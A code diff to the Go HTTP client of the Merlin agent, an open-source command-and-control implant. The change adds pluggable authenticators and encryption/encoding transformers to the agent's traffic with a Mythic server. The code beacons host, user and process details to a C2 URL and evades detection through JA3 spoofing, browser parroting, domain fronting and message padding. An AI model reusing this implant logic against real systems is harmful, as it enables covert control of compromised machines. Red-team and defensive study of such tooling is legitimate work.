@@ -25,24 +25,18 @@ package mythic
 import (
 	// Standard
 	"bytes"
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/hmac"
 	"crypto/rand"
 	"crypto/rsa"
-	"crypto/sha1" // #nosec G505
-	"crypto/sha256"
 	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	rand2 "math/rand"
 	"net"
 	"net/http"
 	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"sync"
@@ -55,13 +49,26 @@ import (
 	"golang.org/x/net/http2"
 
 	// Merlin Message
+	messages "github.com/Ne0nd0g/merlin-message"
 	"github.com/Ne0nd0g/merlin-message/jobs"
+	rsa2 "github.com/Ne0nd0g/merlin-message/rsa"
 
 	// Internal
+	"github.com/Ne0nd0g/merlin-agent/v2/authenticators"
+	rsaAuthenticaor "github.com/Ne0nd0g/merlin-agent/v2/authenticators/rsa"
 	"github.com/Ne0nd0g/merlin-agent/v2/cli"
-	"github.com/Ne0nd0g/merlin-agent/v2/clients"
 	"github.com/Ne0nd0g/merlin-agent/v2/clients/utls"
 	"github.com/Ne0nd0g/merlin-agent/v2/core"
+	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
+	transformer "github.com/Ne0nd0g/merlin-agent/v2/transformers"
+	b64 "github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/base64"
+	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/gob"
+	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/hex"
+	mythicEncoder "github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/mythic"
+	aes2 "github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/aes"
+	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/jwe"
+	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/rc4"
+	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/xor"
 )
 
 // socksConnection is used to map the Mythic incremental integer used for tracking connections to a UUID leveraged by the agent
@@ -72,52 +79,59 @@ var mythicSocksConnection = sync.Map{}
 
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
 type Client struct {
-	clients.MerlinClient
-	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
-	MythicID   uuid.UUID         // The identifier used by the Mythic framework
-	Client     *http.Client      // Client to send messages with
-	Protocol   string            // The HTTP protocol the client will use
-	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
-	Host       string            // HTTP Host header value
-	Proxy      string            // Proxy string
-	Headers    map[string]string // Additional HTTP headers to add to the request
-	UserAgent  string            // HTTP User-Agent value
-	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
-	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
-	Parrot     string            // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
-	psk        []byte            // PSK is the Pre-Shared Key secret the agent will use to start encrypted key exchange
-	secret     []byte            // Secret is the current key that is being used to encrypt & decrypt data
-	privKey    *rsa.PrivateKey   // Agent's RSA Private key to decrypt traffic
+	Authenticator authenticators.Authenticator
+	authenticated bool                      // authenticated tracks if the Agent has successfully authenticated
+	AgentID       uuid.UUID                 // TODO can this be recovered through reflection since client is embedded into agent?
+	MythicID      uuid.UUID                 // The identifier used by the Mythic framework
+	Client        *http.Client              // Client to send messages with
+	Protocol      string                    // The HTTP protocol the client will use
+	URL           string                    // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
+	Host          string                    // HTTP Host header value
+	Proxy         string                    // Proxy string
+	Headers       map[string]string         // Additional HTTP headers to add to the request
+	UserAgent     string                    // HTTP User-Agent value
+	PaddingMax    int                       // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	JA3           string                    // JA3 is a string that represents how the TLS client should be configured, if applicable
+	Parrot        string                    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
+	psk           []byte                    // PSK is the Pre-Shared Key secret the agent will use to start encrypted key exchange
+	secret        []byte                    // Secret is the current key that is being used to encrypt & decrypt data
+	privKey       *rsa.PrivateKey           // Agent's RSA Private key to decrypt traffic
+	insecureTLS   bool                      // insecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
+	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
 }
 
-// Config is a structure that is used to pass in all necessary information to instantiate a new Client
+// Config is a structure used to pass in all necessary information to instantiate a new Client
 type Config struct {
-	AgentID   uuid.UUID // The Agent's UUID
-	PayloadID string    // The UUID used with the Mythic framework
-	Protocol  string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
-	Host      string    // Host is used with the HTTP Host header for Domain Fronting activities
-	URL       string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
-	Proxy     string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
-	UserAgent string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
-	PSK       string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
-	JA3       string    // JA3 is a string that represent how the TLS client should be configured, if applicable
-	Parrot    string    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
-	Padding   string    // Padding is the max amount of data that will be randomly selected and appended to every message
+	AgentID      uuid.UUID // The Agent's UUID
+	AuthPackage  string    // AuthPackage is the type of authentication the agent should use when communicating with the server
+	PayloadID    string    // The UUID used with the Mythic framework
+	Protocol     string    // Proto contains the transportation protocol the agent is using (i.e., http2 or http3)
+	Host         string    // Host is used with the HTTP Host header for Domain Fronting activities
+	URL          string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
+	Proxy        string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
+	UserAgent    string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
+	PSK          string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
+	JA3          string    // JA3 is a string that represents how the TLS client should be configured, if applicable
+	Parrot       string    // Parrot is a feature of the github.com/refraction-networking/utls to mimic a specific browser
+	Padding      string    // Padding is the max amount of data that will be randomly selected and appended to every message
+	InsecureTLS  bool      // InsecureTLS is a boolean that determines if the InsecureSkipVerify flag is set to true or false
+	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
 }
 
-// New instantiates and returns a Client that is constructed from the passed in Config
+// New instantiates and returns a Client constructed from the passed in Config
 func New(config Config) (*Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.New()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
 	client := Client{
-		AgentID:   config.AgentID,
-		URL:       config.URL,
-		UserAgent: config.UserAgent,
-		Host:      config.Host,
-		Protocol:  config.Protocol,
-		Proxy:     config.Proxy,
-		JA3:       config.JA3,
-		Parrot:    config.Parrot,
+		AgentID:     config.AgentID,
+		URL:         config.URL,
+		UserAgent:   config.UserAgent,
+		Host:        config.Host,
+		Protocol:    config.Protocol,
+		Proxy:       config.Proxy,
+		JA3:         config.JA3,
+		Parrot:      config.Parrot,
+		insecureTLS: config.InsecureTLS,
 	}
 
 	// Mythic: Add payload ID
@@ -128,7 +142,7 @@ func New(config Config) (*Client, error) {
 	}
 
 	// Get the HTTP client
-	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot)
+	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, client.Parrot, client.insecureTLS)
 	if err != nil {
 		return &client, err
 	}
@@ -136,14 +150,61 @@ func New(config Config) (*Client, error) {
 	// Set PSK
 	client.psk, err = base64.StdEncoding.DecodeString(config.PSK)
 	if err != nil {
-		return &client, fmt.Errorf("there was an error Base64 decoding the PSK:\r\n%s", err)
+		return &client, fmt.Errorf("there was an error Base64 decoding the PSK:\n%s", err)
 	}
 	client.secret = client.psk
 
-	// Generate RSA key pair
-	client.privKey, err = rsa.GenerateKey(rand.Reader, 4096)
-	if err != nil {
-		return &client, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", err)
+	// Set up the Authenticator
+	switch strings.ToLower(config.AuthPackage) {
+	case "none":
+		return nil, fmt.Errorf("the 'none' authenticator is not supported for the Mythic client")
+	case "opaque":
+		return nil, fmt.Errorf("the 'opaque' authenticator is not supported for the Mythic client")
+	case "rsa":
+		// Generate an RSA key pair
+		client.privKey, err = rsa.GenerateKey(rand.Reader, 4096)
+		if err != nil {
+			return &client, fmt.Errorf("there was an error generating the RSA key pair:\n%s", err)
+		}
+		client.Authenticator = rsaAuthenticaor.New(client.AgentID, *client.privKey)
+	default:
+		return nil, fmt.Errorf("'%s' is not a valid authenticator for the Mythic client", config.AuthPackage)
+	}
+
+	// Transformers
+	transforms := strings.Split(config.Transformers, ",")
+	for _, transform := range transforms {
+		var t transformer.Transformer
+		switch strings.ToLower(transform) {
+		case "aes":
+			t = aes2.NewEncrypter()
+		case "base64-byte":
+			t = b64.NewEncoder(b64.BYTE)
+		case "base64-string":
+			t = b64.NewEncoder(b64.STRING)
+		case "gob-base":
+			t = gob.NewEncoder(gob.BASE)
+		case "gob-string":
+			t = gob.NewEncoder(gob.STRING)
+		case "hex-byte":
+			t = hex.NewEncoder(hex.BYTE)
+		case "hex-string":
+			t = hex.NewEncoder(hex.STRING)
+		case "jwe":
+			t = jwe.NewEncrypter()
+		case "mythic":
+			t = mythicEncoder.NewEncoder()
+		case "rc4":
+			t = rc4.NewEncrypter()
+		case "xor":
+			t = xor.NewEncrypter()
+		default:
+			err = fmt.Errorf("clients/mythic.New(): unhandled transform type: %s", transform)
+			if err != nil {
+				return nil, err
+			}
+		}
+		client.transformers = append(client.transformers, t)
 	}
 
 	// Parse Padding Value
@@ -153,7 +214,10 @@ func New(config Config) (*Client, error) {
 	}
 
 	cli.Message(cli.INFO, "Client information:")
+	cli.Message(cli.INFO, fmt.Sprintf("\tMythic Payload ID: %s", client.MythicID))
 	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
+	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.Authenticator))
+	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
 	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
 	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
 	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
@@ -161,15 +225,80 @@ func New(config Config) (*Client, error) {
 	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
 	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))
 	cli.Message(cli.INFO, fmt.Sprintf("\tParrot String: %s", client.Parrot))
+	cli.Message(cli.INFO, fmt.Sprintf("\tInsecure TLS: %t", client.insecureTLS))
 
 	return &client, nil
 }
 
-// Auth is used to match the merlin client interface but isn't currently used; Should probably fix the interface definition
-func (client *Client) Auth(authType string, register bool) (messages.Base, error) {
-	cli.Message(cli.DEBUG, "Entering into clients.mythic.Auth()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Input authType: %s, register: %v", authType, register))
-	return messages.Base{}, nil
+// Authenticate executes the configured authentication method sending the necessary messages to the server to
+// complete authentication.
+// This function takes in a Base message for when the server returns information to continue
+// the process or needs to re-authenticate.
+func (client *Client) Authenticate(msg messages.Base) (err error) {
+	cli.Message(cli.DEBUG, "Entering into clients.mythic.Authenticate()...")
+	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\n%+v", msg))
+
+	client.authenticated = false
+	var authenticated bool
+
+	// Repeat until authenticator is complete and Agent is authenticated
+	for {
+		msg, authenticated, err = client.Authenticator.Authenticate(msg)
+		if err != nil {
+			return
+		}
+		// An empty message was received indicating to exit the function
+		if msg.Type == 0 {
+			return
+		}
+
+		// Once authenticated, update the client's secret used to encrypt messages
+		if authenticated {
+			client.authenticated = true
+			var key []byte
+			key, err = client.Authenticator.Secret()
+			if err != nil {
+				return
+			}
+			// Don't update the secret if the authenticator returned an empty key
+			if len(key) > 0 {
+				client.secret = key
+			}
+			// Mythic returns a new UUID after authentication has been completed
+			client.MythicID = msg.ID
+			cli.Message(cli.SUCCESS, fmt.Sprintf("%s authentication completed", client.Authenticator))
+			return
+		}
+
+		// Send the message to the server
+		var msgs []messages.Base
+		msgs, err = client.Send(msg)
+		if err != nil {
+			return
+		}
+
+		// Add a response message to the next loop iteration
+		if len(msgs) > 0 {
+			msg = msgs[0]
+		}
+
+		// If the Agent is authenticated, exit the loop and continue
+		if authenticated {
+			return
+		}
+	}
+}
+
+// Listen waits for incoming data on an established connection, deconstructs the data into a Base messages, and returns them
+func (client *Client) Listen() (returnMessages []messages.Base, err error) {
+	err = fmt.Errorf("clients/mythic.Listen(): the Mythic HTTP client does not support the Listen function")
+	return
+}
+
+// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
+// can be sent/received.
+func (client *Client) Synchronous() bool {
+	return false
 }
 
 // Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server
@@ -177,7 +306,7 @@ func (client *Client) Auth(authType string, register bool) (messages.Base, error
 // This is where the client's logic is for communicating with the server.
 func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.Send()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\r\n%+v", m))
+	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\n%+v", m))
 
 	// Set the message padding
 	if client.PaddingMax > 0 {
@@ -185,9 +314,9 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	}
 	cli.Message(cli.DEBUG, fmt.Sprintf("Added message padding size: %d", len(m.Padding)))
 
-	payload, err := client.convertToMythicMessage(m)
+	payload, err := client.Construct(m)
 	if err != nil {
-		err = fmt.Errorf("there was an error converting the Merlin message to a Mythic message:\r\n%s", err)
+		err = fmt.Errorf("there was an error converting the Merlin message to a Mythic message:\n%s", err)
 		return
 	}
 
@@ -209,9 +338,9 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	}
 
 	// Build the request
-	req, err := http.NewRequest("POST", client.URL, strings.NewReader(payload))
+	req, err := http.NewRequest("POST", client.URL, bytes.NewReader(payload))
 	if err != nil {
-		err = fmt.Errorf("there was an error building the HTTP request:\r\n%s", err)
+		err = fmt.Errorf("there was an error building the HTTP request:\n%s", err)
 		return
 	}
 
@@ -225,116 +354,81 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 
 	// Send the request
 	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
-	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
-	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request Payload:\r\n%+v", req.Body))
+	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\n%+v", req))
+	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request Payload:\n%+v", req.Body))
 	resp, err := client.Client.Do(req)
 	if err != nil {
-		err = fmt.Errorf("there was an error sending a message to the server:\r\n%s", err)
+		err = fmt.Errorf("there was an error sending a message to the server:\n%s", err)
 		return
 	}
-	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Response:\r\n%+v", resp))
+	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Response:\n%+v", resp))
 	// Process the response
 
 	// Check the status code
 	switch resp.StatusCode {
 	case 200:
 	default:
-		err = fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
+		err = fmt.Errorf("there was an error communicating with the server:\n%d", resp.StatusCode)
+		return
+	}
+
+	// Check to make sure message response contained data
+	if resp.ContentLength == 0 {
+		err = fmt.Errorf("the response message did not contain any data")
 		return
 	}
 
 	// Read the response body
-	respData, err := ioutil.ReadAll(resp.Body)
+	respData, err := io.ReadAll(resp.Body)
 	if err != nil {
-		err = fmt.Errorf("there was an error reading the HTTP payload response message:\r\n%s", err)
+		err = fmt.Errorf("there was an error reading the HTTP payload response message:\n%s", err)
 		return
 	}
-
-	// Base64 decode the payload
-	decodedPayload, err := base64.StdEncoding.DecodeString(string(respData))
-	if err != nil {
-		err = fmt.Errorf("there was an error base64 decoding the HTTP payload response message:\r\n%s", err)
-		return
-	}
-
-	// Verify UUID matches
-	if !strings.HasPrefix(string(decodedPayload), client.MythicID.String()) {
-		err = fmt.Errorf("response message agent ID %s does not match current ID %s",
-			uuid.MustParse(string(decodedPayload[:len(client.MythicID)])), client.MythicID.String())
-		return
-	}
-
-	// Strip the Mythic UUID from the payload
-	decodedPayload = bytes.TrimPrefix(decodedPayload, []byte(client.MythicID.String()))
-
-	// Decrypt the payload
-	plaintext, err := client.aesDecrypt(decodedPayload)
-	if err != nil {
-		err = fmt.Errorf("there was an error decrypting the payload:\r\n%s", err)
-		return
-	}
-
-	cli.Message(cli.DEBUG, fmt.Sprintf("Decrypted JSON:\r\n%s", plaintext))
-	return client.convertToMerlinMessage(plaintext)
+	return client.Deconstruct(respData)
 }
 
 // Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
-func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
+func (client *Client) Initial() (err error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.Initial()...")
 
+	as := agent.NewAgentService()
+	a := as.Get()
+
+	// Mythic requires a specific agent Checkin message format after authentication
 	// Build an initial checkin message
 	checkIn := CheckIn{
-		Action:        "checkin",
-		IP:            selectIP(agent.SysInfo.Ips),
-		OS:            agent.SysInfo.Platform,
-		User:          agent.SysInfo.UserName,
-		Host:          agent.SysInfo.HostName,
-		PID:           agent.SysInfo.Pid,
-		PayloadID:     client.MythicID.String(), // Need to set now because it will be changed to tempUUID from RSA key exchange
-		Arch:          agent.SysInfo.Architecture,
-		Domain:        agent.SysInfo.Domain,
-		Integrity:     agent.SysInfo.Integrity,
-		ExternalIP:    "",
-		EncryptionKey: "",
-		DecryptionKey: "",
+		Action:    "checkin",
+		IP:        selectIP(a.Host().IPs),
+		OS:        a.Host().Platform,
+		User:      a.Process().UserName,
+		Host:      a.Host().Name,
+		Process:   a.Process().Name,
+		PID:       a.Process().ID,
+		PayloadID: client.MythicID.String(), // Need to set now because it will be changed to tempUUID from RSA key exchange
+		Arch:      a.Host().Architecture,
+		Domain:    a.Process().Domain,
+		Integrity: a.Process().Integrity,
 	}
 
-	// RSA Key Exchange
-	rsaRequest := RSARequest{
-		Action:    RSAStaging,
-		PubKey:    base64.StdEncoding.EncodeToString(x509.MarshalPKCS1PublicKey(&client.privKey.PublicKey)),
-		SessionID: core.RandStringBytesMaskImprSrc(20),
-	}
-
-	base := messages.Base{
-		ID:      client.AgentID,
-		Type:    messages.KEYEXCHANGE,
-		Payload: rsaRequest,
-	}
-
-	_, err := client.Send(base)
+	// Authenticate the Agent
+	err = client.Authenticate(messages.Base{})
 	if err != nil {
-		return messages.Base{}, fmt.Errorf("there was an error performing RSA Key exchange:\r\n%s", err)
+		return
 	}
 
 	// Send checkin message
-	base.Type = messages.CHECKIN
-	base.Payload = checkIn
+	base := messages.Base{
+		ID:      client.AgentID,
+		Type:    messages.CHECKIN,
+		Payload: checkIn,
+	}
 
 	_, err = client.Send(base)
 
-	if err != nil {
-		return messages.Base{}, err
-	}
-
-	returnMessage := messages.Base{
-		ID:   client.AgentID,
-		Type: messages.IDLE,
-	}
-	return returnMessage, nil
+	return
 }
 
-// Set is a generic function that is used to modify a Client's field values
+// Set is a generic function used to modify a Client's field values
 func (client *Client) Set(key string, value string) error {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.Set()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
@@ -342,16 +436,18 @@ func (client *Client) Set(key string, value string) error {
 	switch strings.ToLower(key) {
 	case "ja3":
 		ja3String := strings.Trim(value, "\"'")
-		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String, client.Parrot)
+		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String, client.Parrot, client.insecureTLS)
 		if ja3String != "" {
 			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
 		} else if ja3String == "" {
 			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
 		}
 		client.JA3 = ja3String
+	case "paddingmax":
+		client.PaddingMax, err = strconv.Atoi(value)
 	case "parrot":
 		parrot := strings.Trim(value, "\"'")
-		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, parrot)
+		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3, parrot, client.insecureTLS)
 		if parrot != "" {
 			cli.Message(cli.NOTE, fmt.Sprintf("Set agent HTTP transport parrot to:%s", parrot))
 		} else if parrot == "" {
@@ -383,7 +479,7 @@ func (client *Client) Get(key string) string {
 }
 
 // getClient returns an HTTP client for the passed protocol, proxy, and ja3 string
-func getClient(protocol, proxyURL, ja3, parrot string) (*http.Client, error) {
+func getClient(protocol string, proxyURL string, ja3 string, parrot string, insecure bool) (*http.Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.getClient()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s, JA3 String: %s, Parrot: %s", protocol, proxyURL, ja3, parrot))
 	/* #nosec G402 */
@@ -391,7 +487,7 @@ func getClient(protocol, proxyURL, ja3, parrot string) (*http.Client, error) {
 	// Setup TLS configuration
 	TLSConfig := &tls.Config{
 		MinVersion:         tls.VersionTLS12,
-		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
+		InsecureSkipVerify: insecure, // #nosec G402 - intentionally configurable to allow self-signed certificates. See https://github.com/Ne0nd0g/merlin/issues/59
 		CipherSuites: []uint16{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
@@ -399,46 +495,27 @@ func getClient(protocol, proxyURL, ja3, parrot string) (*http.Client, error) {
 	}
 
 	// Proxy
-	var proxy func(*http.Request) (*url.URL, error)
-	if proxyURL != "" {
-		rawURL, errProxy := url.Parse(proxyURL)
-		if errProxy != nil {
-			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
-		}
-		proxy = http.ProxyURL(rawURL)
-	} else {
-		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
-		proxy = http.ProxyFromEnvironment
+	proxyFunc, errProxy := getProxy(protocol, proxyURL)
+	if errProxy != nil {
+		return nil, errProxy
 	}
 
 	// JA3
 	if ja3 != "" {
-		transport, err := utls.NewTransportFromJA3Insecure(ja3)
+		transport, err := utls.NewTransportFromJA3(ja3, insecure, proxyFunc)
 		if err != nil {
 			return nil, err
 		}
-
-		// Set proxy
-		if proxyURL != "" {
-			transport.Proxy(proxy)
-		}
-
 		return &http.Client{Transport: transport}, nil
 	}
 
-	// Parrot - If a JA3 string was set, it will be used and the parroting will be ignored
+	// Parrot - If a JA3 string was set, it will be used, and the parroting will be ignored
 	if parrot != "" {
 		// Build the transport
-		transport, err := utls.NewTransportFromParrotInsecure(parrot)
+		transport, err := utls.NewTransportFromParrot(parrot, insecure, proxyFunc)
 		if err != nil {
 			return nil, err
 		}
-
-		// Set proxy
-		if proxyURL != "" {
-			transport.Proxy(proxy)
-		}
-
 		return &http.Client{Transport: transport}, nil
 	}
 
@@ -461,13 +538,13 @@ func getClient(protocol, proxyURL, ja3, parrot string) (*http.Client, error) {
 		transport = &http.Transport{
 			TLSClientConfig: TLSConfig,
 			MaxIdleConns:    10,
-			Proxy:           proxy,
+			Proxy:           proxyFunc,
 			IdleConnTimeout: 1 * time.Nanosecond,
 		}
 	case "http":
 		transport = &http.Transport{
 			MaxIdleConns:    10,
-			Proxy:           proxy,
+			Proxy:           proxyFunc,
 			IdleConnTimeout: 1 * time.Nanosecond,
 		}
 	default:
@@ -476,10 +553,29 @@ func getClient(protocol, proxyURL, ja3, parrot string) (*http.Client, error) {
 	return &http.Client{Transport: transport}, nil
 }
 
-// convertToMerlinMessage takes in a byte array that is unmarshalled from a JSON structure to Mythic structure and
+// Deconstruct takes in a byte array that is unmarshalled from a JSON structure to Mythic structure, and
 // then it is subsequently converted into a Merlin messages.Base structure
-func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []messages.Base, err error) {
-	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMerlinMessage()...")
+func (client *Client) Deconstruct(data []byte) (returnMessages []messages.Base, err error) {
+	cli.Message(cli.DEBUG, "Entering into clients.mythic.Deconstruct()...")
+
+	// Transforms
+	for _, t := range client.transformers {
+		var ret any
+		if t.String() == "mythic" {
+			ret, err = t.Deconstruct(data, []byte(client.MythicID.String()))
+			data = ret.([]byte)
+		} else {
+			ret, err = t.Deconstruct(data, client.secret)
+			data = ret.([]byte)
+		}
+		if err != nil {
+			err = fmt.Errorf("there was an error transforming the Mythic message:\n%s", err)
+			return
+		}
+	}
+
+	cli.Message(cli.DEBUG, fmt.Sprintf("Decrypted JSON:\n%s", data))
+
 	// Determine the action, so we know what structure to unmarshal to
 	var action string
 	if bytes.Contains(data, []byte("\"action\":\"checkin\"")) {
@@ -493,7 +589,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 	} else if bytes.Contains(data, []byte("\"action\":\"upload\"")) {
 		action = UPLOAD
 	} else {
-		err = fmt.Errorf("message did not contain a known action:\r\n%s", data)
+		err = fmt.Errorf("message did not contain a known action:\n%s", data)
 		return
 	}
 
@@ -510,53 +606,38 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 		// Unmarshal the JSON message
 		err = json.Unmarshal(data, &msg)
 		if err != nil {
-			err = fmt.Errorf("there was an error unmarshalling the JSON object in the message handler:\r\n%s", err)
+			err = fmt.Errorf("there was an error unmarshalling the JSON object in the message handler:\n%s", err)
 			return
 		}
 		if msg.Status == "success" {
-			cli.Message(cli.SUCCESS, "initial checkin successful")
+			cli.Message(cli.SUCCESS, "Initial checkin successful")
 			client.MythicID = uuid.MustParse(msg.ID)
 			return
 		}
-		err = fmt.Errorf("unknown checkin action status:\r\n%+v", msg)
+		err = fmt.Errorf("unknown checkin action status:\n%+v", msg)
 		return
 	case RSAStaging:
 		// https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin#eke-by-generating-client-side-rsa-keys
-		var msg RSAResponse
+		var msg rsa2.Response
 		err = json.Unmarshal(data, &msg)
 		if err != nil {
-			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.RSAResponse in the message handler:\r\n%s", err)
+			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.RSAResponse in the message handler:\n%s", err)
 			return
 		}
-		// Base64 decode session key
-		var key []byte
-		key, err = base64.StdEncoding.DecodeString(msg.SessionKey)
-		if err != nil {
-			err = fmt.Errorf("there was an error Base64 decoding the RSA session key:\r\n%s", err)
-			return
-		}
-		// Decrypt with RSA Private key and update the Client's secret key to use the session key
-		hash := sha1.New() // #nosec G401
-		client.secret, err = rsa.DecryptOAEP(hash, rand.Reader, client.privKey, key, nil)
-		if err != nil {
-			err = fmt.Errorf("there was an error decrypting the returned RSA session key:\r\n%s", err)
-			return
-		}
-		// Update to use new Temp UUID
-		client.MythicID = uuid.MustParse(msg.ID)
-		cli.Message(cli.SUCCESS, "RSA key exchange completed")
-		return
+		returnMessage.Type = messages.KEYEXCHANGE
+		returnMessage.Payload = msg
+		returnMessages = append(returnMessages, returnMessage)
 	case TASKING:
 		var msg Tasks
 		// Unmarshal the JSON message
 		err = json.Unmarshal(data, &msg)
 		if err != nil {
-			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.Tasks in the message handler:\r\n%s", err)
+			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.Tasks in the message handler:\n%s", err)
 			return
 		}
 		// If there are any tasks/jobs, add them
 		if len(msg.Tasks) > 0 {
-			cli.Message(cli.DEBUG, fmt.Sprintf("returned Mythic tasks:\r\n%+v", msg))
+			cli.Message(cli.DEBUG, fmt.Sprintf("returned Mythic tasks:\n%+v", msg))
 			returnMessage, err = client.convertTasksToJobs(msg.Tasks)
 			if err != nil {
 				return
@@ -579,13 +660,13 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 		var msg ServerPostResponse
 		err = json.Unmarshal(data, &msg)
 		if err != nil {
-			err = fmt.Errorf("there was an error unmarshalling the JSON object to a mythic.ServerTaskResponse structure in the message handler:\r\n%s", err)
+			err = fmt.Errorf("there was an error unmarshalling the JSON object to a mythic.ServerTaskResponse structure in the message handler:\n%s", err)
 			return
 		}
 		cli.Message(cli.NOTE, fmt.Sprintf("post_response results from the server: %+v", msg))
 		for _, response := range msg.Responses {
 			if response.Error != "" {
-				cli.Message(cli.WARN, fmt.Sprintf("There was an error sending a task to the Mythic server:\r\n%+v", response))
+				cli.Message(cli.WARN, fmt.Sprintf("There was an error sending a task to the Mythic server:\n%+v", response))
 			}
 			if response.FileID != "" {
 				cli.Message(cli.DEBUG, fmt.Sprintf("Mythic FileID: %s", response.FileID))
@@ -615,11 +696,11 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 	return
 }
 
-// convertToMythicMessages takes in Merlin message base, converts it into to a Mythic message JSON structure,
+// Construct takes in Merlin message base, converts it into to a Mythic message JSON structure,
 // encrypts it, prepends the Mythic UUID, and Base64 encodes the entire string
